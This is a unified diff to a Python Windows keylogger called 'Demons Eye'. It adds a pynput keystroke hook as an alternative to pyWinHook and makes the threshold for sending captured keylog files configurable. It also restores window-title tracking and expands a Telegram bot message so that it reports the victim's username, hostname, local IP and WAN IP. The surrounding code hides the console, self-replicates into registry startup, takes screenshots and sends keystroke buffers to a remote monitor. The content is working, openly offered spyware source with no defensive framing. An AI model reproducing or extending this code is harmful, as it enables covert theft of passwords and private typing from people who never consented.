@@ -60,6 +60,7 @@ import mss
 import os
 import platform
 from smtplib import SMTP
+from pynput import keyboard
 import pythoncom
 import pyWinhook as pyHook
 import requests
@@ -87,8 +88,10 @@ KLGPRE = 'klg_'                         # Keylogger file name prefix (keystrokes
 KLGEXT = '.dek'                         # Keylogger file extension for data file
 SCRPRE = 'scr_'                         # Screenshot file name prefix
 SCREXT = '.png'                         # Screenshot file extension
-KEYCODE_EXIT = 6                        # CTRL + E : special combination to close / deactivate keylogger
+KEYCODE_EXIT = 6                        # CTRL + F : special combination to close / deactivate keylogger
+PYNPUT_CTRL_EXIT_CHR = 'f'              # CTRL + char : special combination to close using pynput
 KEYSTOSCREENSHOT = 100                  # Screenshots every x Keystrokes (default value)
+FILESIZETRIGGER = 4096                  # Default keylogger file size trigger to send data
 
 # Server constants
 SERVER_IP = ''
@@ -103,6 +106,10 @@ DEFAULT_MONITOR_PORT = 7777             # Monitor port where to send data
 MONITOR_SOCKET_TIMEOUT = 3              # Timeout socket connection
 MAGIC_RESPONSE = DEMONS_EYE_ID + ' ' + APPNAME + ' ' + VERSION
 ENCODING = 'utf-8'
+
+# Hooking method
+HOOK_PYWINHOOK  = 0                     # Module PyWinHook
+HOOK_PYNPUT     = 1                     # Module pynput
 
 
 ########################################################
@@ -119,10 +126,6 @@ old_event = None
 # avoided for each key pressed. When the key_max_chars limit is exceeded the buffer is written to disk.
 key_max_chars = 25
 key_buffer = ''
-
-# File size control (in bytes) that activates to be sent to remote storage. When the size of the keylog file exceeds
-# this size, then the file is sent, then it is deleted and a new keylog file is created.
-file_size_trigger = 1024
 
 # Path and file name of keylogger data file. The name is assigned in the create_keylog_file() function.
 # Also use the constants KLGPRE and KLGEXT
@@ -143,9 +146,11 @@ monitor_enable_send = False                     # Enabled? It could be avoided b
 monitor_ip = None                               # Destination IP
 monitor_port = DEFAULT_MONITOR_PORT             # Destination PORT
 
-# Global Mouse and Keyboard Hook
+# Global Mouse and Keyboard Hook for pyWinHook
 hm = None
 
+# Previous key, used in pynput
+key_previous = None
 
 ########################################################
 # CLASSES
@@ -615,8 +620,52 @@ def save_special_control_key(event):
     return switcher.get(event.Key.upper(), True)
 
 
-# Adds key to buffer
-def add_key_to_buffer(event):
+# pynput | keyboard event hook
+def on_press_key_pynput(key):
+    global key_buffer, key_max_chars, key_counter, args, key_previous
+
+    close_app = False
+    # check exit keylogger
+    if key_previous == keyboard.Key.ctrl_l and str(key).strip("'") == PYNPUT_CTRL_EXIT_CHR:
+        logging.debug('Cerrando aplicación por combinación especial de tecla')
+        close_app = True
+
+    if len(str(key)) > 3:       # Special key
+        ckey = '[' + str(key).replace('Key.', '') + ']'
+    else:
+        ckey = str(key).strip("'")
+        key_counter += 1
+        # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
+        if key_counter % args.keystoscreenshot == 0:
+            capture_screen()
+
+    if key == keyboard.Key.enter:
+        ckey += CRLF
+
+    logging.debug('Key previous {} | Current key {}'.format(key_previous, ckey))
+
+    key_buffer += ckey
+    key_previous = key
+
+    # if buffer is full, it empties it and sends the file if necessary
+    if len(key_buffer) > key_max_chars:
+        monitor_data_send(key_buffer)  # Sends buffer data to monitor
+        flush_key_buffer_to_disk()
+        # if the file size has exceeded the limit
+        if os.path.getsize(keylog_name) >= args.filesizetrigger:
+            keylog_send = keylog_name
+            create_keylog_file()  # creates new keylog file
+            send_keylog_file(keylog_send)
+
+    # Exit control
+    if close_app:
+        return False
+    else:
+        return True
+
+
+# pyWinHook | Adds key to buffer
+def add_key_to_buffer_pyWinHook(event):
     global key_buffer, key_max_chars, key_counter, args
     key = event.Ascii
 
@@ -645,12 +694,12 @@ def add_key_to_buffer(event):
         if key_counter % args.keystoscreenshot == 0:
             capture_screen()
 
-    # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
+    # if buffer is full, it empties it and sends the file if necessary
     if len(key_buffer) > key_max_chars:
         monitor_data_send(key_buffer)         # Sends buffer data to monitor
         flush_key_buffer_to_disk()
         # if the file size has exceeded the limit
-        if os.path.getsize(keylog_name) >= file_size_trigger:
+        if os.path.getsize(keylog_name) >= args.filesizetrigger:
             keylog_send = keylog_name
             create_keylog_file()                # creates new keylog file
             send_keylog_file(keylog_send)
@@ -658,22 +707,20 @@ def add_key_to_buffer(event):
     return True
 
 
-# Mouse events control. No mouse events are recorded except window changes
-def on_mouse_event(event):
+# pyWinHook | Mouse events control. No mouse events are recorded except window changes
+def on_mouse_event_pyWinHook(event):
     global old_event
 
     # si el usuario cambia de ventana, la registra
-    '''
     if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
         register_window_name(repr(event.WindowName))
 
     old_event = event
-    '''
     return True     # IMPORTANT. True must be returned
 
 
-# Keyboard events control
-def on_keyboard_event(event):
+# pyWinHook | Keyboard events control
+def on_keyboard_event_pyWinHook(event):
     global key_buffer, key_counter, old_event, server, hm
     close_app = False
 
@@ -704,7 +751,7 @@ def on_keyboard_event(event):
             close_app = True
 
         # save key to buffer
-        add_key_to_buffer(event)
+        add_key_to_buffer_pyWinHook(event)
 
         # Saves current event info to compare with next one.
         old_event = event
@@ -723,9 +770,14 @@ def exit_demonseye():
     global key_buffer, threadList, server, hm, keylog_name
     logging.debug('Entering exit_demonseye')
 
-    # Unhooking
-    hm.UnhookKeyboard()
-    hm.UnhookMouse()
+    if args.hookmodule == HOOK_PYWINHOOK:       # pyWinHook
+        # Unhooking
+        hm.UnhookKeyboard()
+        hm.UnhookMouse()
+    elif args.hookmodule == HOOK_PYNPUT:        # pyinput
+        pass
+    else:
+        pass
 
     # Stopping server
     server.stop_server()
@@ -822,10 +874,14 @@ def parse_params():
                         help='No Hide console. Only for Debug.')
     parser.add_argument('-k', '--keystoscreenshot', type=int, default=KEYSTOSCREENSHOT,
                         help='Number of keystrokes to take a screenshot. Default value: {}'.format(KEYSTOSCREENSHOT))
+    parser.add_argument('-t', '--filesizetrigger', type=int, default=FILESIZETRIGGER,
+                        help='File size trigger to send data. Default value: {}'.format(FILESIZETRIGGER))
     parser.add_argument('--replicate', action='store_true', required=False, default=False,
                         help='Self-replicate and permanent install into registry')
     parser.add_argument('--noscreenshot', action='store_true', required=False, default=False,
                         help='Disable Screenshot capture')
+    parser.add_argument('-m', '--hookmodule', type=int, choices=[0, 1], default=0,
+                        help='Hook module to use. 0=pyWinHook, 1=pynput. Default value: 0')
     parser.add_argument('-v', '--verbose', type=int, choices=[0, 1, 2, 3, 4, 5], default=0,
                         help='Debug verbose to console when testing. Default value: 0')
     parser.add_argument('-f', '--logtofile', action='store_true', required=False, default=False,
@@ -852,8 +908,10 @@ if args.logtofile:
 logging.basicConfig(level=set_logging_level(args.verbose), format=log_format, datefmt=log_date_fmt,
                     handlers=log_handlers)
 
-logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Screenshot every {} keys'.
-              format(args.verbose, args.logtofile, args.noscreenshot, args.keystoscreenshot))
+logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Screenshot every {} keys' +
+              'File Size Trigger {} | Hook method {} '.
+              format(args.verbose, args.logtofile, args.noscreenshot, args.keystoscreenshot, args.filesizetrigger,
+                     args.hookmodule))
 
 # Init some useful variables
 cpu = platform.processor()
@@ -867,8 +925,6 @@ filerealpath = os.path.realpath(execname)
 extension = os.path.splitext(filerealpath)[1]
 driveunit = os.path.splitdrive(filerealpath)[0]
 
-# Ensures that keylogger starts at system startup
-# add_keylogger_to_startup()
 
 # Hide console Window
 if not args.nohide:
@@ -887,24 +943,41 @@ create_keylog_file()
 if args.replicate:
     add_keylogger_to_startup(self_replicate(filerealpath))
 
-# Creates new hook manager
-hm = pyHook.HookManager()
-
-# Register event callbacks
-hm.MouseAllButtonsDown = on_mouse_event
-hm.KeyDown = on_keyboard_event
-
-# Sets hook for Mouse and Keyboard
-hm.HookMouse()
-hm.HookKeyboard()
-
 # Create server that listens TCP petitions from Monitor
 server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
 server.start()
 # threadList.append(server)
 
-# Telegram Bot start message - Simply as a testimonial notification
-telegram_bot_message('Starting ' + APPNAME + ' v' + VERSION)
+# Telegram Bot start message notifying that the keylogger is up and running with user and host
+telegram_bot_message('Iniciando {} v{} para el Usuario {} en el Equipo {} {}'
+                     'Su IP Local es {} y la IP Wan es {}'.
+                     format(APPNAME, VERSION, username, hostname, CRLF, localip, externalip))
 
-# Wait indefinitely
-pythoncom.PumpMessages()
+# Select Hook modules to operate
+if args.hookmodule == HOOK_PYWINHOOK:                   # pyWinHook
+    logging.info('Usando pyWinHook')
+    # Creates new hook manager
+    hm = pyHook.HookManager()
+
+    # Register event callbacks
+    hm.MouseAllButtonsDown = on_mouse_event_pyWinHook
+    hm.KeyDown = on_keyboard_event_pyWinHook
+    # Sets hook for Mouse and Keyboard
+    hm.HookMouse()
+    hm.HookKeyboard()
+
+    # Wait indefinitely
+    pythoncom.PumpMessages()
+elif args.hookmodule == HOOK_PYNPUT:                    # pynput
+    logging.info('Usando pynput')
+    with keyboard.Listener(on_press=on_press_key_pynput) as listener:
+        try:
+            listener.join()
+        except Exception as e:
+            logging.error('Excepcion {} en pynput'.format(e))
+    exit_demonseye()
+else:
+    logging.error('Error en parametro hookmodule')      # this should not happen
+
+
+
